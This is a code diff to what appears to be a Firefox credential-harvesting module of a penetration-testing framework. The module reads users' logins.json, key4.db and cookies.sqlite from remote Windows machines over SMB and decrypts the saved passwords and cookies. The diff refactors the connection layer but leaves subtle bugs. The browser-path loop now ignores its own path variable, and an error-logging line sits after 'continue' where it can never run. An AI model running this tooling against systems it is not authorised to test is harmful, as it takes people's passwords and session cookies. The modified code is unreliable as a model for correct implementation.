@@ -11,9 +11,8 @@ from dataclasses import dataclass
 from typing import Any
 from Cryptodome.Cipher import AES, DES3
 from pyasn1.codec.der import decoder
-from dploot.lib.smb import DPLootSMBConnection
+from dploot.lib.network import DPLootConnection
 
-from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
 
 CKA_ID = unhexlify("f8000000000000000000000000000001")
 
@@ -69,7 +68,7 @@ class FirefoxTriage:
         "All Users",
     )
 
-    def __init__(self, target, logger, conn: DPLootSMBConnection = None, per_secret_callback: Any = None):
+    def __init__(self, target, logger, conn: DPLootConnection = None, per_secret_callback: Any = None):
         self.target = target
         self.logger = logger
         self.conn = conn
@@ -77,18 +76,15 @@ class FirefoxTriage:
         self.per_secret_callback = per_secret_callback
 
     def run(self, gather_cookies=False):
-        if self.conn is None:
-            upgrade_to_dploot_connection(target=self.target)
-
         firefox_data = []
         firefox_cookies = []
         # list users
-        users = self.get_users()
+        users = self.conn.list_users()
         for browser, path in self.gecko_paths.items():
             self.logger.debug(f"Gather {browser}")
             for user in users:
                 try:
-                    directories = self.conn.remote_list_dir(share=self.share, path=path.format(user))
+                    directories = self.conn.list_dir(share=self.share, path=self.firefox_generic_path.format(user))
                 except Exception as e:
                     if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                         continue
@@ -98,19 +94,19 @@ class FirefoxTriage:
                 for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
                     try:
                         if gather_cookies:
-                            cookies_path = ntpath.join(path.format(user), d.get_longname(), "cookies.sqlite")
-                            cookies_data = self.conn.readFile(self.share, cookies_path)
+                            cookies_path = ntpath.join(self.firefox_generic_path.format(user), d.get_longname(), "cookies.sqlite")
+                            cookies_data = self.conn.read_file(path=cookies_path, share=self.share)
                             if cookies_data is not None:
                                 firefox_cookies += self.parse_cookie_data(user, cookies_data)
-                        logins_path = path.format(user) + "\\" + d.get_longname() + "\\logins.json"
-                        logins_data = self.conn.readFile(self.share, logins_path)
+                        logins_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\logins.json"
+                        logins_data = self.conn.read_file(path=logins_path, share=self.share)
                         if logins_data is None:
                             continue  # No logins.json file found
                         logins = self.get_login_data(logins_data=logins_data)
                         if len(logins) == 0:
                             continue  # No logins profile found
-                        key4_path = path.format(user) + "\\" + d.get_longname() + "\\key4.db"
-                        key4_data = self.conn.readFile(self.share, key4_path)
+                        key4_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\key4.db"
+                        key4_data = self.conn.read_file(path=key4_path, share=self.share)
                         if key4_data is None:
                             continue
                         # Get all available master keys (Firefox 144+ may have multiple keys)
@@ -152,7 +148,7 @@ class FirefoxTriage:
                     except Exception as e:
                         if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                             continue
-                        self.logger.exception(e)
+                            self.logger.exception(e)
         return firefox_data
 
     def parse_cookie_data(self, windows_user, cookies_data):
@@ -261,17 +257,6 @@ class FirefoxTriage:
         except Exception as e:
             self.logger.debug(e)
             return "", "", ""
-
-    def get_users(self):
-        users = []
-
-        users_dir_path = "Users\\*"
-        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
-
-        for d in directories:
-            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
-                users.append(d.get_longname())  # ruff: ignore[manual-list-comprehension], ignoring for readability
-        return users
 
     @staticmethod
     def decode_login_data(data):
